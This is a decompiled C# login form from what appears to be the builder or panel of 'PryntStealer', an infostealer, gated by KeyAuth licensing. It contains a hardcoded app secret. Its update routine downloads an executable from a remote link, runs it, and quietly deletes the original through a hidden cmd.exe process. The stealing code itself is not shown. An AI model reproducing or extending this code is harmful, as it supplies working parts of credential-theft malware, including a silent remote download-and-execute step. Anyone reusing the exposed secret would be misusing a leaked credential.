using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using PryntStealer;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace KeyAuth
{
	// Token: 0x02000006 RID: 6
	public partial class Login : Form
	{
		// Token: 0x0600002A RID: 42 RVA: 0x000039FA File Offset: 0x00001BFA
		public Login()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003A08 File Offset: 0x00001C08
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00003A10 File Offset: 0x00001C10
		private void Login_Load(object sender, EventArgs e)
		{
			Login.KeyAuthApp.init();
			if (Login.KeyAuthApp.response.message == "test")
			{
				if (!string.IsNullOrEmpty(Login.KeyAuthApp.app_data.downloadLink))
				{
					DialogResult dialogResult = MessageBox.Show("New Version Is Available Click yes To open in browser\nNo to download file automatically", "Auto update", MessageBoxButtons.YesNo);
					if (dialogResult != DialogResult.Yes)
					{
						if (dialogResult != DialogResult.No)
						{
							MessageBox.Show("Invalid option");
							Environment.Exit(0);
						}
						else
						{
							WebClient webClient = new WebClient();
							string text = Application.ExecutablePath;
							string str = Login.random_string();
							text = text.Replace(".exe", "-" + str + ".exe");
							webClient.DownloadFile(Login.KeyAuthApp.app_data.downloadLink, text);
							Process.Start(text);
							Process.Start(new ProcessStartInfo
							{
								Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
								WindowStyle = ProcessWindowStyle.Hidden,
								CreateNoWindow = true,
								FileName = "cmd.exe"
							});
							Environment.Exit(0);
						}
					}
					else
					{
						Process.Start(Login.KeyAuthApp.app_data.downloadLink);
						Environment.Exit(0);
					}
				}
				MessageBox.Show("There is a update available. Contact The Developer For Updated Copy.");
				Thread.Sleep(2500);
				Environment.Exit(0);
			}
			if (!Login.KeyAuthApp.response.success)
			{
				MessageBox.Show(Login.KeyAuthApp.response.message);
				Environment.Exit(0);
			}
			Login.KeyAuthApp.check();
			this.siticoneLabel1.Text = string.Format("Current Session Validation Status: {0}", Login.KeyAuthApp.response.success);
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00003BB8 File Offset: 0x00001DB8
		private static string random_string()
		{
			string text = null;
			Random random = new Random();
			for (int i = 0; i < 5; i++)
			{
				text += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0))).ToString();
			}
			return text;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00003C14 File Offset: 0x00001E14
		private void UpgradeBtn_Click(object sender, EventArgs e)
		{
			Login.KeyAuthApp.upgrade(this.username.Text, this.key.Text);
			this.status.Text = "Status: " + Login.KeyAuthApp.response.message;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003C68 File Offset: 0x00001E68
		private void LoginBtn_Click(object sender, EventArgs e)
		{
			Login.KeyAuthApp.login(this.username.Text, this.password.Text);
			if (Login.KeyAuthApp.response.success)
			{
				new Form1().Show();
				base.Hide();
				return;
			}
			this.status.Text = "Status: " + Login.KeyAuthApp.response.message;
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003CDC File Offset: 0x00001EDC
		private void RgstrBtn_Click(object sender, EventArgs e)
		{
			Login.KeyAuthApp.register(this.username.Text, this.password.Text, this.key.Text);
			if (Login.KeyAuthApp.response.success)
			{
				new Form1().Show();
				base.Hide();
				return;
			}
			this.status.Text = "Status: " + Login.KeyAuthApp.response.message;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003D5C File Offset: 0x00001F5C
		private void LicBtn_Click(object sender, EventArgs e)
		{
			Login.KeyAuthApp.license(this.key.Text);
			if (Login.KeyAuthApp.response.success)
			{
				new Form1().Show();
				base.Hide();
				return;
			}
			this.status.Text = "Status: " + Login.KeyAuthApp.response.message;
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003DC4 File Offset: 0x00001FC4
		private void label2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0400000E RID: 14
		public static api KeyAuthApp = new api("pryntstealer2", "UVH9g2bJwp", "f6224ad21ff76cbd2d52679818d9204efb39dbfbf8c289b4b624f1b9c3f36ef0", "7.0");
	}
}
